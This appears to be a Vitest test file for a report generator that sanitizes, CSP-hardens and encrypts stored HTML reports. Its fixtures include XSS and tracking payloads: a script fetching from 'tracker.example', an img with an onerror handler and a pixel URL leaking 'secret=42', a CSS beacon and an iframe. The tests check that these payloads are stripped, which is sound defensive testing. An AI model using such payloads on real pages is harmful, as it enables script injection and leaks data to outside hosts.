import { beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { initCrypto } from '../../services/crypto'
import {
  getReport,
  purgeLegacyGlobalReports,
  saveReport,
} from '../../services/reportGenerator'
import { setActiveSession } from '../../services/userSession'

const USER_ID = 'report-security'
const scopedKey = (id: string) => `arty-${USER_ID}-report-${id}`

beforeAll(async () => {
  localStorage.clear()
  setActiveSession({
    userId: USER_ID,
    authMethod: 'apikey',
    displayName: 'Report Security',
    createdAt: 1,
  })
  await initCrypto('report-security-secret')
})

beforeEach(() => {
  const reportKeys: string[] = []
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i)
    if (key?.startsWith(`arty-${USER_ID}-report-`)) reportKeys.push(key)
  }
  reportKeys.forEach((key) => localStorage.removeItem(key))
})

describe('reportGenerator — confidential storage and rendering', () => {
  it('sanitizes active/network content, embeds a fail-closed CSP, then encrypts at rest', async () => {
    const id = await saveReport('Privé', `
      <script>fetch('https://tracker.example/script')</script>
      <img src="https://tracker.example/pixel?secret=42" onerror="alert(1)" alt="pixel">
      <div style="background-image:url(https://tracker.example/css);width:75%">barre</div>
      <iframe src="https://tracker.example/frame"></iframe>
    `)

    const raw = localStorage.getItem(scopedKey(id))
    expect(raw).toMatch(/^v2:/)
    expect(raw).not.toContain('secret=42')

    const html = await getReport(id)
    expect(html).toContain('data-arty-report-hardened="1"')
    expect(html).toContain('Content-Security-Policy')
    expect(html).toContain("default-src 'none'")
    expect(html).toContain('style="width:75%"')
    expect(html).not.toContain('tracker.example')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<iframe')
    expect(html).not.toContain('onerror')
  })

  it('purges ownerless legacy keys without touching scoped reports', () => {
    localStorage.setItem('arty-report-legacy', '<html>legacy private report</html>')
    localStorage.setItem(scopedKey('keep'), 'scoped-value')

    expect(purgeLegacyGlobalReports()).toBe(1)
    expect(localStorage.getItem('arty-report-legacy')).toBeNull()
    expect(localStorage.getItem(scopedKey('keep'))).toBe('scoped-value')
  })

  it('hardens and encrypts a transient scoped plaintext report on first read', async () => {
    localStorage.setItem(
      scopedKey('plaintext'),
      '<!DOCTYPE html><html><head></head><body><img src="https://tracker.example/pixel"></body></html>',
    )

    const html = await getReport('plaintext')

    expect(html).not.toContain('tracker.example')
    expect(html).toContain('Content-Security-Policy')
    expect(localStorage.getItem(scopedKey('plaintext'))).toMatch(/^v2:/)
  })
})
